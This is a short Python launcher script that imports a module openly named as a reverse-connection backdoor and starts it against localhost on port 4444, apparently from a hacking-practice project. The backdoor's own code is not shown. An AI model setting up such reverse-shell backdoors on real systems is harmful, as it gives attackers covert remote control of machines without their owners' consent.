#!/usr/bin/env python

import Reverse_connection_backdoor as rev_backdoor

backdoor = rev_backdoor.Reverse_connection_backdoor("localhost", 4444)
backdoor.start(bufferSize=1024)


